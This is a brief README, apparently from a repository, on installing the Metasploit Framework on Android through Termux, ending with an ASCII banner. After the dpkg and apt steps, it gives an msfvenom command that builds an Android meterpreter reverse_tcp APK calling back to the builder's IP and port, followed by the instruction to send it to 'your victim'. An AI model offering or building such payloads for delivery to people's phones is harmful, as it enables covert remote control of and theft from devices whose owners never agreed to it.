# metasploit-framework
Step to Install
gunzip metasploit_5.0.65-1_all.deb.gz
dpkg -i metasploit_5.0.65-1_all.deb
apt -f install
Optinal apt-get install ruby make clang autoconf curl wget ncurses-utils libsqlite postgresql libpcap libffi libxslt pkg-config
msfconsole 
msfvenom for create payload
example : msfvenom -p android/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT >R /storage/sdcard0/payload.apk
and send to your victim
   _____    ______________________________ ____  ____________  ____ 
  /  _  \  /   _____/\_   _____/\______   \\   \/  /\______  \/_   |
 /  /_\  \ \_____  \  |    __)_  |     ___/ \     /     /    / |   |
/    |    \/        \ |        \ |    |     /     \    /    /  |   |
\____|__  /_______  //_______  / |____|____/___/\  \  /____/   |___|
        \/        \/         \/      /_____/     \_/                
        
     Thanks To Wiki Termux For This Package & Your Tutorial 
